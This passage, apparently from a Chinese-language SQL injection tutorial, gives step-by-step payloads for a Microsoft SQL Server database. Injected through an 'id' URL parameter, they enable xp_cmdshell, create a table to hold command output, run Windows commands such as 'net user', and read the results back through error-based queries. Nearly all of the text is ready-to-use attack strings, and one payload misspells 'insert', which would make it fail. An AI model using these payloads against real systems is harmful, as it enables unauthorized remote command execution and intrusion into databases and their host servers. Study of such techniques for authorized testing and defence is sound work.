五：xp_cmdshell

xp_cmdshell默认状态是关闭的/管理员才能开启

开启xp_cmdshell功能
?id=1'; EXEC sp_configure 'show advanced options', 1;   --
?id=1'; RECONFIGURE;    --
?id=1'; EXEC sp_configure 'xp_cmdshell', 1;   --
?id=1'; RECONFIGURE;   --
添加表名和列名
?id=1'; create table sqldata(yihua varchar(8000));--   //在当前数据库添加一个"sqldata"的表名和"yihua"的列名
向数据库写入文件
?id=1'; insert into sqldata (yihua) exec master..xp_cmdshell 'echo xxx';--   //向列写入"xxx"
读取写入的数据
?id=1' and 1=(select top 1 cast(yihua as varchar(8000)) from sqldata where yihua not in(select top 0 isnull(yihua,'') from sqldata))%2bchar(126)--    //查询结果为xxx

xp_cmdshell开启成功

清除表
?id=1'; delete from sqldata;--   //清除表
向数据库写入命令
?id=1';inster into sqldata (yihua) exec master..xp_cmdshell 'net user'--				//查看有哪些用户，windows命令
查看执行结果
?id=1' and 1=(select top 1 cast(yihua as varchar(8000)) from sqldata where yihua not in(select top 0 isnull(yihua,'') from sqldata))%2bchar(126)--
